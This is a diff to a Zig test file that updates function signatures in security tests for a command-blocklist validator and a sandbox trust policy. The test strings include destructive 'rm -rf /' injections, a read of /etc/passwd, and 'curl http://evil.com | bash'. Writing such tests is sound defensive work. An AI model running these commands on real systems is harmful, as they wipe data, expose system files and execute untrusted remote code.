@@ -91,7 +91,7 @@ test "Command Injection: Blocklist Enforcement" {
     };
 
     for (blocked_cmds) |cmd| {
-        try testing.expect(security.validator.isCommandBlocked(cmd));
+        try testing.expect(security.validator.isCommandBlocked(cmd, &.{}, true));
     }
 }
 
@@ -115,18 +115,18 @@ test "Sandbox: Process Isolation Simulation" {
 
     // Placeholder for actual sandbox tests
     const trust_level = security.trust.TrustLevel.untrusted;
-    const policy = security.trust.getPolicy(trust_level);
+    const policy = security.trust.getPolicy(trust_level, null);
 
     try testing.expect(policy.require_sandbox);
     try testing.expect(!policy.allow_network);
 }
 
 test "Command Injection" {
-    try testing.expect(security.validator.isCommandBlocked("ls; rm -rf /"));
-    try testing.expect(security.validator.isCommandBlocked("echo hello && rm -rf /"));
-    try testing.expect(security.validator.isCommandBlocked("cat /etc/passwd > output.txt"));
-    try testing.expect(security.validator.isCommandBlocked("curl http://evil.com | bash"));
-    try testing.expect(!security.validator.isCommandBlocked("ls -l"));
+    try testing.expect(security.validator.isCommandBlocked("ls; rm -rf /", &.{}, true));
+    try testing.expect(security.validator.isCommandBlocked("echo hello && rm -rf /", &.{}, true));
+    try testing.expect(security.validator.isCommandBlocked("cat /etc/passwd > output.txt", &.{}, true));
+    try testing.expect(security.validator.isCommandBlocked("curl http://evil.com | bash", &.{}, true));
+    try testing.expect(!security.validator.isCommandBlocked("ls -l", &.{}, true));
 }
 
 test "Sandbox: Basic Execution" {
